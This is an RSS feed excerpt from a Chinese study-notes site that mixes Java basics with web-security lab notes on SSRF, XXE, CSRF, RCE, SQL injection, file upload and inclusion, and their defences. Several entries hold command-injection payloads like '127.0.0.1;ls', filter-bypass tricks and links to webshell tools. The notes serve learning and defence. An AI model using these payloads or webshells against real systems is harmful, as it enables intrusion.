查看ip归属信息： Whois (cnnic.net.cn) 可以查看大陆ip归属信息 iP地址查询&amp;ndash;手机号码查询归属地 | 邮政编码查询 | iP地址归属地查询 | 身份证号码验证在线查询网 (ip138.</description></item><item><title>02-php中文件上传漏洞相关函数和伪协议</title><link>https://ob.tianzhongs.ml/02-php%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02-php%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/</guid><description> 相关函数 函数一 函数 作用 nclude() include 语句包含并运行指定文件 include_once() 只包含一次，不重复包含 require() 和include一样，不过出错时会停止 require_once() 和include_once一样 fopen() 打开文件或者 URL 函数二 函数 作用 readfile 读取文件并写入到输出缓冲。 highlight_file 语法高亮一个文件 show_source 等于highlight_file() file_get_contents 将整个文件读入一个字符串 file 把整个文件读入一个数组中 伪协议 使用：parse_str(file_get_contents('php://input'), $_PUT); 了解： php中的伪协议 id:: 643512c6-6a53-46c1-a204-742947900230</description></item><item><title>02-SSRF漏洞的防御</title><link>https://ob.tianzhongs.ml/02-SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02-SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1/</guid><description> 1、禁用协议：禁用一些http等之外的协议 2、限制请求端口：限制一些特殊的端口，只能访问80、8080等端口 3、设置URL白名单：限制只能请求特定的一些url范围或者正则规范 4、过滤返回信息：只能返回一些过滤的信息 5、统一错误信息：如果返回错误，就封装错误信息，隐藏真正的返回信息</description></item><item><title>02-webshell工具</title><link>https://ob.tianzhongs.ml/02-webshell%E5%B7%A5%E5%85%B7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02-webshell%E5%B7%A5%E5%85%B7/</guid><description>webshell分类 一句话木马： 代码短，只有一行代码。 场景多，可以单独生成文件，也可以插入到图 片中。 安全性高，隐匿性强，可变形免杀 小马：体积小，功能少，只有文件上传功能 大马：功能强、体积大，管理数据库、提权、控制计算机、文件管理等等 webshell工具集合 https://github.com/tennc/webshell 包含了各种语言的webshell工具</description></item><item><title>02-XXE漏洞</title><link>https://ob.tianzhongs.ml/02-XXE%E6%BC%8F%E6%B4%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02-XXE%E6%BC%8F%E6%B4%9E/</guid><description>XXE漏洞主要是通过外部实体引入的方式进行攻击的（有点类似于文件包含漏洞） 外部实体ENTITY的使用 {:height 213, :width 517} 攻击流程 1、确定使用XML传输数据（抓包可得） 2、发送到Repeater 3、添加DTD，引用外部问文档 4、Send得到响应 盲打-DNSLog 由于没有回显，可以通过访问dns服务器，根据dns服务器是否有解析记录，判断是否有攻击成功 过程 在dnslog生成一个子域名 DNSLog Platform 将子域名添加到下列的xml中 1 2 3 4 &amp;lt;?</description></item><item><title>02-什么是cookie</title><link>https://ob.tianzhongs.ml/02-%E4%BB%80%E4%B9%88%E6%98%AFcookie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02-%E4%BB%80%E4%B9%88%E6%98%AFcookie/</guid><description>public:: true
cookie主要作用是保持会话，其内容是key=value的格式存在。 使用cookie不仅可以记住用户登录的状态，还可以跟踪用户的行为（比如平时手机推送的广告等等可能会根据你浏览数据的记录存入cookie中，个性化推送广告）
当第一次浏览器进行访问的时候，会在电脑设置cookie，之后访问都会携带电脑存储的cookie内容。
Set-Cookie：第一次访问，服务器响应给客户端 Cookie：之后的访问，客户端发送给服务器
cookie的一些常用参数 MIME 描述 name=value cookie的键值对（必需） expires cookie的过期时间 max-age cookie多久过期（单位是秒） domain cookie对哪个域名生效 path cookie匹配的路径 secure 只有HTTPS连接，才发送cookie到服务器 httponly 不允许通过脚本document.</description></item><item><title>02.SQL注入之MYSQL语句语法</title><link>https://ob.tianzhongs.ml/02.SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E8%AF%AD%E5%8F%A5%E8%AF%AD%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02.SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E8%AF%AD%E5%8F%A5%E8%AF%AD%E6%B3%95/</guid><description>SQL注入之数据库概述 数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。
关系型数据库 关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的表格比较相似
关系型数据库中表与表之间有很多复杂的关联关系的
常见的关系型数据库有MySQL，Orcale，PostgreSQL , SQL Server等。
非关系型数据库 随着近些年技术方向的不断扩展，大量的NoSQL数据库如 Mon goDB，Redis出于简化数据库结构，避免冗余，影响性能的表连接。摒弃复杂分布式的目的被设计
NoSQL数据库适合追求速度和可扩展性，业务多变的场景
数据库排行：https://db-engines.com/en/ranking
数据库服务器层级关系： 服务器里面 ：多个数据库 ：多个数据表 ：多个行 列 字段 ： 数据</description></item><item><title>021_递归</title><link>https://ob.tianzhongs.ml/021_%E9%80%92%E5%BD%92/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/021_%E9%80%92%E5%BD%92/</guid><description>021_递归 递归方法必须有结束条件，否则就会栈溢出错误，因为没有结束的条件，递归会一直不断地执行新的自己的方法，导致栈溢出。 递归有结束条件，但也会发生栈溢出，因为递归太深了，自身的栈内存不够用了，一直不断地压栈。 递归不断的循环，可能会导致JVM死掉，非常耗费内存 能用for或者while替换，尽量不用递归 书写思路 如何进入循环的，比如阶乘，是根据此一个值去乘以-1之后的方法，然后再加上自己自己本身，sum(n-1)+1 更重要的是停止方法的条件，如何将自己停止，一般是需要返回值，特殊的条件是什么样的，返回什么值。 1 2 3 4 5 if(a!=0) { sum(a); } `` 如果栈溢出怎么解决</description></item><item><title>022_面向对象和面向过程</title><link>https://ob.tianzhongs.ml/022_%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/022_%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/</guid><description>022_面向对象和面向过程 常见语言 C是面向过程 C++是一般面向过程，一般面向对象 java是完全面向对象
面向过程 面向过程注重步骤，注重实现这个功能的因果关系，每一步之间的因果关系，联系形成子模块，耦合度高，扩展能力就差 对于小型项目，面向过程方便直接开发，效率高，快速开发 面向对象 面向对象符合人类的思维方式，将世界分割成不同的单元形成驱动，然后驱动各个对象，形成一个系统 耦合度低，扩展能力强 三大特征：封装 继承 多态 ^sandatezheng 有了封装才能说继承，有了继承，才能说多态 ^c344fe 当我们采用面向对象的方式贯穿系统，需要 OOA 面向对象分析 OOD 面向对象设计 OOP 面向对象编程</description></item><item><title>023_对象和类</title><link>https://ob.tianzhongs.ml/023_%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/023_%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%B1%BB/</guid><description>023_对象和类 简要 类是抽象的概念，好像一个模板 对象是一个实际存在的个体，对象的另一个名称就是**“实例”** 通过类创建对象的过程，称为**“实例化”** 根据多个对象的共同属性抽取形成的概念，叫做**“抽象”**
1 2 3 4 5 graph LR l1(对象) l2(类) l1--抽象--&amp;gt;l2 l2--实例化--&amp;gt;l1 举例 eg</description></item><item><title>024_对象的创建</title><link>https://ob.tianzhongs.ml/024_%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/024_%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA/</guid><description>024_对象的创建 创建对象 通过new来创建一个对象 对象存储在**“堆”**当中
堆内存中存储对象，以及对象的实例变量 实例变量就是对象变量，也就是对象的属性，例如student.name
局部变量存储在栈内存中
1 类名 变量名=new 类名(); Java中所有的类，都是一个数据类型，且都是引用数据类型 一般在进行调用的时候，是调用的对象的地址，而不是对象本身。 比如 在Student s=new Student();中，进行调用s的时候，是对其s的对象地址进行调用，而不是对象本身，所以类都是引用数据类型的。</description></item><item><title>025_空指针异常</title><link>https://ob.tianzhongs.ml/025_%E7%A9%BA%E6%8C%87%E9%92%88%E5%BC%82%E5%B8%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/025_%E7%A9%BA%E6%8C%87%E9%92%88%E5%BC%82%E5%B8%B8/</guid><description>025_空指针异常 基本 “空引用”访问实例（对象相关）的数据，都会出现空指针异常。 当一个java对象没有任何的引用指向该对象时，垃圾回收期GC就会将该垃圾数据释放回收掉。 垃圾回收主要针对与堆内存的数据进行回收
举例 定义一个垃圾类，创建垃圾对象l1，对l1进行引用置空，出现空指针异常
创建类Laji 1 2 3 4 5 package a001对象的创建; public class Laji { int id; String name; } `` 创建垃圾对象l1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 package a001对象的创建; public class LajiTest { public static void main(String[] args) { Laji l1=new Laji(); l1.</description></item><item><title>026_方法调用时的参数传递</title><link>https://ob.tianzhongs.ml/026_%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E6%97%B6%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/026_%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E6%97%B6%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92/</guid><description>026_方法调用时的参数传递 形式参数 1 2 3 4 5 6 7 8 9 10 11 public class Cscd { public static void main(String[] args) { int i=10; add(i); System.</description></item><item><title>03-csrf漏洞检测以及防御</title><link>https://ob.tianzhongs.ml/03-csrf%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-csrf%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1/</guid><description>检测工具 Burp Suite CSRF Tester  https://github.com/s0md3v/Bolt  各种云产品 防御 使用referer字段：引用页; 引荐; 来源页面。作用：跟踪来源，比如访问统计、广告效果 使用一些自定义的随机字段，使其无法伪造 二次验证，比如短信等等，目前很多支付都有此类验证。 tips chrome和firefox的不同， chrome的跨站请求会干掉request url字段中末尾所带的参数</description></item><item><title>03-ctfhub-过滤cat</title><link>https://ob.tianzhongs.ml/03-ctfhub-%E8%BF%87%E6%BB%A4cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-ctfhub-%E8%BF%87%E6%BB%A4cat/</guid><description> 和 [[02-ctfhub-命令注入]]一样，只不过不能用cat查看文件内容，使用less或者其他的查看就行了</description></item><item><title>03-dvwa</title><link>https://ob.tianzhongs.ml/03-dvwa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-dvwa/</guid><description>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 low Structured Query Language http://127.</description></item><item><title>03-RCE漏洞的防御</title><link>https://ob.tianzhongs.ml/03-RCE%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-RCE%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1/</guid><description> 使用的框架，升级到最新的版本，安装补丁等，避免旧版本的漏洞 尽量不要使用命令执行的函数 如果必须使用，需要做白名单处理 用正则表达式对用户输入的内容进行处理 使用WA</description></item><item><title>03-XXE-Lab</title><link>https://ob.tianzhongs.ml/03-XXE-Lab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-XXE-Lab/</guid><description>搭建 使用phpstudy放进去就行了，操作过于简单 案例 打开网站，输入用户名以及密码，进行登录，提示了用户名错误 使用burp suite进行抓包，发现发送的是xml封装的数据格式 对发送的xml数据中，添加外部实体引入，并在内容中进行使用，添加的外部引入例子如下（查看系统文件信息） 1 2 3 &amp;lt;!</description></item><item><title>03-什么是session</title><link>https://ob.tianzhongs.ml/03-%E4%BB%80%E4%B9%88%E6%98%AFsession/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-%E4%BB%80%E4%B9%88%E6%98%AFsession/</guid><description> 简单理解：session相当于cookie的身份证，唯一标识了你的身份信息
因为cookie太多了，每次传输会比较占用速率，所以通过使用session来标识一个cookie，一般设置成一个id，每次认证，只需要通过传输session的id号来判断其对应的cookie，提交了访问速度。
cookie和session的示意图： 区别： cookie一般是存储在客户端，而session一般是存储在服务端 session并没有替代cookie，而是相当于使用session标识了一个cookie
步骤：
访问网站，网站收到访问，会产生一个session文件，保存在服务器上，session文件中存储的就是cookie内容； 将cookie发送给客户端； 客户端将cookie的值进行操作，比如记住密码，登录等等，并将cookie发送给服务器； 服务器接收到cookie值，并在session的cookie内容中进行修改对应的值； 后续登录，验证session，保持登录会话； 销毁session，cookie过期。</description></item><item><title>03-如何发现SSRF漏洞</title><link>https://ob.tianzhongs.ml/03-%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0SSRF%E6%BC%8F%E6%B4%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0SSRF%E6%BC%8F%E6%B4%9E/</guid><description>实际案例 1、爬取地址 2、查看是否请求了其他资源 简述：在url查看是否有类似于URL=XXX的其他链接的请求 也可以用Google语法搜索关键字：inurl share、wap、url、link、src、source、target、u、 3g、display、sourceURL、imageURL、domain 发现工具 https://github.com/cujanovic/SSRF-Testing https://github.com/tarunkant/Gopherus https://github.com/swisskyrepo/SSRFmap [[.</description></item><item><title>03-端口服务信息收集</title><link>https://ob.tianzhongs.ml/03-%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid><description>public:: true
#question 为什么收集端口号的信息？
计算机上的服务，都通过端口进行监听，查看其服务的端口号是否在工作中，能够判断其开启的服务或者系统状态。比如myql默认的端口号是3306，查看3306的端口号信息就能判断是否运行mysql服务
查看本机端口信息
1 2 3 4 Windows netstat -aon|findstr 3306 Linux netstat -an|grep 3306 远程机器端口</description></item><item><title>03-网站控制工具</title><link>https://ob.tianzhongs.ml/03-%E7%BD%91%E7%AB%99%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03-%E7%BD%91%E7%AB%99%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7/</guid><description> 中国菜刀 中国蚁剑 https://github.com/[AntSwordProject](https://wiki.doingnothing.online/#AntSwordProject)/antSword weevely https://github.com/epinna/weevely3 哥斯拉 godzilla https://github.com/[BeichenDream](https://wiki.doingnothing.online/#BeichenDream)/Godzilla 冰蝎 behinder https://github.com/rebeyond/Behinder</description></item><item><title>03.SQL注入之MYSQL系统库</title><link>https://ob.tianzhongs.ml/03.SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E7%B3%BB%E7%BB%9F%E5%BA%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/03.SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E7%B3%BB%E7%BB%9F%E5%BA%93/</guid><description>一.系统库释义 提供了访问数据库元数据的方式
元数据是关于数据库的数据，如数据库名和表名，列的数据类型或访问权限。
{:height 335, :width 734}
1.information_schema 库：是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；
例如数据库或表的名称，列的数据类型或访问权限。有时用于此信息的其他术语是数据字典和系统目录。web渗透过程中用途很大。
1 2 3 4 5 SCHEMATA 表：提供了当前MySQL实例中所有数据库信息， show databases结果取之此表。 ​ TABLES表：提供了关于数据中表的信息。table_name ​ COLUMNS表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。column_name 2、performance_schema库具有87张表。 MySQL 5.</description></item><item><title>031_构造方法</title><link>https://ob.tianzhongs.ml/031_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/031_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95/</guid><description>031_构造方法 概念 构造方法的作用：
构造方法就是用来构造对象，并对对象属性进行初始化赋值的特殊方法
比较特殊的方法 构造方法是一个比较特殊的方法，通过构造方法可以完成对象的创建，以及实例变量的初始化 作用相当于使用函数去创建对象，同时对实例化对象进行赋值 方法就类似于函数，不要在其中添加class 构造方法可以有多个，当参数列表不同，支持方法重载 格式 构造方法语法格式：
1 2 3 修饰符列表 方法名(形式参数){ 方法体; } 使用new 方法名进行调用</description></item><item><title>032_注意事项</title><link>https://ob.tianzhongs.ml/032_%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/032_%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid><description>032_注意事项 注意 修饰符列表目前统一使用public,不要使用public static 构造方法名与类名保持一致 构造方法不需要指定返回值类型 当一个类中手动的提供了有参数的构造方法，那么系统就不再提供无参数的构造方法 5.当一个类中没有提供任何构造方法，系统会提供一个默认的构造方法 1 System.out.println(new Student()); `` 输出显示 1 a003构造方法.Student@7de26db8 `` 没有定义student()构造方法，但是依旧会有默认的缺省构造器可以使用 ^2dca02 在编译的时候，如果构造方法的名称和类名不一致，那么编译器会认为其是普通方法，但是没有写返回值，会报错。 [!</description></item><item><title>033_构造方法举例</title><link>https://ob.tianzhongs.ml/033_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%BE%E4%BE%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/033_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%BE%E4%BE%8B/</guid><description>033_构造方法举例 构造方法的作用
创建对象，同时将对象的属性进行赋值
对无参数构造方法进行赋值 user类
1 2 3 4 5 public class User { int id; String name; int age; } id,age的默认值是0，name的默认值是null，</description></item><item><title>034_夫妻结婚</title><link>https://ob.tianzhongs.ml/034_%E5%A4%AB%E5%A6%BB%E7%BB%93%E5%A9%9A/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/034_%E5%A4%AB%E5%A6%BB%E7%BB%93%E5%A9%9A/</guid><description>034_夫妻结婚 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package day14作业; public class Handw { public static void main(String[] args) { // 创建丈夫对象蔡徐坤 Husband cxk = new Husband(&amp;#34;1234&amp;#34;,&amp;#34;蔡徐坤&amp;#34;,&amp;#34;1998年8月2日&amp;#34;,null); // 创建妻子对象篮球 Wife basketball=new Wife(&amp;#34;1235&amp;#34;,&amp;#34;篮球&amp;#34;,&amp;#34;1928年5月2日&amp;#34;,null); //开始结婚 cxk.</description></item><item><title>04-CMS指纹识别</title><link>https://ob.tianzhongs.ml/04-CMS%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/04-CMS%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</guid><description>public:: true
question 什么是指纹识别？
通过关键特征，识别出目标的CMS系统、服务 器、开发语言、操作系统、CDN、WAF的类别 版本等等
识别的对象
1、CMS信息：比如Discuz、织梦、帝国CMS、PHPCMS、ECshop等；
2、前端技术：比如HTML5、jquery、bootstrap、Vue、ace等；
3、开发语言：比如PHP、Java、Ruby、Python、C#等；
4、Web服务器：比如Apache、 Nginx、IIS、lighttpd等；
5、应用服务器：比如Tomcat、Jboss、Weblogic、Websphere等；
6、操作系统信息：比如Linux、win2k8、win7、Kali、Centos等；
7、CDN信息：是否使用CDN，如cloudflare、帝联、蓝讯、网宿、七牛云、阿里云等；
8、WAF信息：是否使用WAF，如D盾、云锁、宝塔、安全狗、360等</description></item><item><title>04-ctfhub</title><link>https://ob.tianzhongs.ml/04-ctfhub/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/04-ctfhub/</guid><description>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 https://www.</description></item><item><title>04-ctfhub-过滤目录分隔符</title><link>https://ob.tianzhongs.ml/04-ctfhub-%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/04-ctfhub-%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6/</guid><description>[[思路]] 使用cd切换到对应目录然后再操作 （命令之间使用;） 或者%0a代替目录分隔符/ payload 查看目录 1 127.0.0.1;ls 查看flag文件名 1 127.</description></item><item><title>04-ctfub-过滤空格</title><link>https://ob.tianzhongs.ml/04-ctfub-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/04-ctfub-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC/</guid><description>使用一些linux中可以替换空格的即可 使用IFS$9、%09、&amp;lt;、&amp;gt;、&amp;lt;&amp;gt;、{,}、%20、${ IFS}、${IFS}来代替空格 payload 查看目录 1 127.0.0.1;ls 以base64查看flag 1 127.</description></item><item><title>04-javaScript操作cookie</title><link>https://ob.tianzhongs.ml/04-javaScript%E6%93%8D%E4%BD%9Ccookie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/04-javaScript%E6%93%8D%E4%BD%9Ccookie/</guid><description>public:: true
javascript获取cookie
浏览器获取cookie和设置cookie实现登录的工具：Cookie-Editor
删除就是将其cookie置空即可。
1 2 3 4 获取：document.cookie; 设置：document.cookie=&amp;#34;username=wuya&amp;#34;; 修改： 删除：</description></item><item><title>04-XXE防御方法</title><link>https://ob.tianzhongs.ml/04-XXE%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/04-XXE%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95/</guid><description> 微信官方的处理方式：https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5 基本都是通过禁用解析xml实体的方式来防御XXE漏洞攻击 也可以通过waf或者关键字过滤等等方式进行防御</description></item><item><title>041_封装</title><link>https://ob.tianzhongs.ml/041_%E5%B0%81%E8%A3%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/041_%E5%B0%81%E8%A3%85/</guid><description>041_封装 [[../02基本/022.面向对象和面向过程#^c344fe|封装]]的作用 [!作用] 保证内部结构的安全性 屏蔽复杂，暴露简单
怎么进行封装 ^zmfg 属性私有化private 创建简单的访问入口:对外提供公开的set和get方法作为实例方法,一个属性对外提供两个实例方法（get和set），同时可以对其的set实例方法设立关卡，满足什么条件才set。 ^cjjddfwrk get方法： java public 返回值类型 get+属性名首字母大写(无参数){ return xxx; } set方法： java public void set+属性名首字母大写(类型 xxx){ this.</description></item><item><title>042_实例方法</title><link>https://ob.tianzhongs.ml/042_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/042_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</guid><description>042_实例方法 [!概要] 与实例相关的有：实例变量，实例方法 实例变量就是对象变量，实例方法就是对象方法 实例相关的都需要先new对象，通过引用的方式进行访问 实例变量相当于一个对象，需要我们自己创建一个对象实例来对其进行引用，才能够使用。每次创建一个实例变量，JVM就会为实例变量分配内存 也就是实例方法必须通过实例对象.去进行调用
语法格式 相当于普通方法去掉static修饰符
1 2 3 public void 方法名(){ 方法体 } 举例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class Shilifangfa { public static void main(String[] args) { // 在进行普通方法调用时，通过.</description></item><item><title>043_书写格式</title><link>https://ob.tianzhongs.ml/043_%E4%B9%A6%E5%86%99%E6%A0%BC%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/043_%E4%B9%A6%E5%86%99%E6%A0%BC%E5%BC%8F/</guid><description>043_书写格式 Java的封装[[041b-封装#^zmfg|格式]]举例 对java对象的属性进行私有化 1 2 3 4 pulic class Person{ private int age;//private私有化修饰符 private String name; } [[041b-封装#^e24f40|对外提供get和set公开入口]] 1 2 3 4 5 6 7 8 9 10 11 pulic class Person{ private int age;//private私有化修饰符 public int getAge(){//获取，需要返回值 return age; } public void setAge(int nianLing){//修改，不需要返回值 age=nianLing; } } 以上的get和set方法都没有加static修饰符，因为其为实例方法，需要依赖于生成的对象，没有对象，就不知道设置谁的属性了，这样才符合规律。没有person对象，设置年龄没用。</description></item><item><title>05-CDN指纹识别</title><link>https://ob.tianzhongs.ml/05-CDN%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/05-CDN%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</guid><description>CDN云观测：http://cdn.chinaz.com/ cdnplanet 脚本探测：xcdn title:: CDN指纹识别
#question 如何获取CDN背后的真实IP？
1、超级ping 2、历史DNS 3、通过子域名查询IP 4、国外主机解析 5、其他
#question CDN如何配置？
CNAME解析到CDN服务器
CDN指纹识别[[软件工具]] ： #常规工具 - ping - nslookup - 超级ping - ldb（load balance detector）</description></item><item><title>05-文件上传漏洞的利用与防御</title><link>https://ob.tianzhongs.ml/05-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/05-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</guid><description>利用 利用流程 1、找到上传的位置 2、尝试绕过校验，上传文件 3、获得文件位置 4、蚁剑连接，管理文件 绕过 总结：删除/禁用JS、修改MIME、等价扩展名、大小写、 htaccess、双写、空格、点、::$DATA、%00截断、0x00截 断、图片马、条件竞争等等。 发现 https://github.</description></item><item><title>05-文件包含漏洞挖掘与利用</title><link>https://ob.tianzhongs.ml/05-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/05-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/</guid><description>挖掘 关键字 URL参数名字出现了page、file、filename、include等等关键 字。 URL参数值出现了文件名，比如xxx.php xxx.html 